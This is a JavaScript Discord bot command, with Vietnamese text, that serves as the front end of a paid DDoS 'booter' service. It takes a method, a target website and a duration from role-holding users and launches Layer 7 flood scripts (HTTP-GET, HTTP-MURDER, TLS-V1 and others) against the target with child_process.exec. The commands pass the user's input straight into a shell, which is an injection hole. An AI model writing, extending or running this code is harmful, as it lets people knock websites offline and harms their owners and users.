const { MessageEmbed } = require("discord.js")
const ayarlar = require('../../ayarlar.json');
var version = ayarlar.versionbot;
var roleID1 = ayarlar.roleID1;
var img = ayarlar.img;

module.exports = {
    name: 'freel7',
    description: 'TẤN CÔNG CÁC TRANG WEB VỚI LAYER7 FREE',
    type: 'CHAT_INPUT',
    cooldown:  60,
    options: [
      {
    name: "methods",
      description: "Enter your methods",
       type: "STRING",
       required : true,
      choices: [{

            name: `${'HTTPS-POWER (FREE)'}`,
            value: `${'HTTPS-POWER (FREE)'}`,
            inline: true
        }, {
            name: `${'HTTP-MURDER (FREE)'}`,
            value: `${'HTTP-MURDER (FREE)) '}`,
            inline: true
        }, {
            name: `${'HTTP-GET (FREE)'}`,
            value: `${'HTTP-GET (FREE) '}`,
            inline: true
        },{
        name: `${'HTTP-RAND (FREE)'}`,
            value: `${'HTTP-RAND (FREE) '}`,
            inline: true
              
              }, {
            name: `${'TLS-V1 (FREE)'}`,
            value: `${'TLS-V1 (FREE)'}`,
            inline: true
      }
        ],
      }, 
{
  name: "target",
  description:"ENTER  WEBSITE TO SENT ATTACK",
  required: true,  
  type: "STRING"
},
      {
  name: "time",
  description:"ENTER TIME WEBSITE TO SENT ATTACK",
  required: true,  
  type: "STRING"
      }],
  run: async (client, interaction) => {

    
    if (!interaction.member.roles.cache.has(roleID1))
      return interaction.reply({
        embeds: [
          new MessageEmbed()
            .setColor("RANDOM")
            .setDescription(`Chỉ có <@&${roleID1}> mới được dùng lệnh này \n Liên Hệ VIOLATION#1111 Để Mua  Sài Nhé!`)
            .setFooter({ text: "© Developer: VIOLATION#1111" })
            .setTimestamp(),
        ],
      });  
       const methods = interaction.options.getString("methods")
      const target = interaction.options.getString("target")
const time = 
interaction.options.getString("time")

       
if (methods === 'HTTP-GET (FREE)') {
var value = 'HTTP-GET (FREE)';
var exec = require('child_process').exec
      exec(`node HTTP-GET.js ${target} 443 ${time}`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ FREE ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
}

          
          
       
      if (methods === 'HTTP-RAND (FREE)') {
        var value = 'HTTP-RAND (FREE)';
    var exec = require('child_process').exec
      exec(`node HTTP-RAND.js ${target} ${time}`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ FREE ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
        }
      if (methods === 'HTTP-MURDER (FREE)') {
        var value = 'HTTP-MURDER (FREE)';
    var exec = require('child_process').exec
      exec(`node HTTP-MURDER.js ${target} ${time}`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ FREE ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
        }

        
        if (methods === 'HTTPS-FORCE (FREE)') {
  var value = 'HTTPS-FORCE (FREE)';
var exec = require('child_process').exec
      exec(`node HTTPS-FORCE.js GET 300 ${target} ${time} 4000`, (error, stdout, stderr) => {
    });
    console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ FREE] \n\`\`\``,
                inline: true

})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }

if (methods === 'HTTPS-POWER (FREE)') {
var value = 'HTTPS-POWER (FREE)';
  var exec = require('child_process').exec
      exec(`node HTTPS-POWER.js GET ${target} http.txt ${time} 3000 4000`, (error, stdout, stderr) => {
    });
  console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
     const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ FREE ] \n\`\`\``,
                inline: true
})
  .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }
        
     if (methods === 'TLS-V1 (FREE)') {
      var value = 'TLS-V1 (FREE)';
    var exec = require('child_process').exec
      exec(`node TLS-V1.js ${target} ${time} 3000`, (error, stdout, stderr) => {
    });
  console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
    const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ FREE ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }
  }

 }  
        
 
                                                                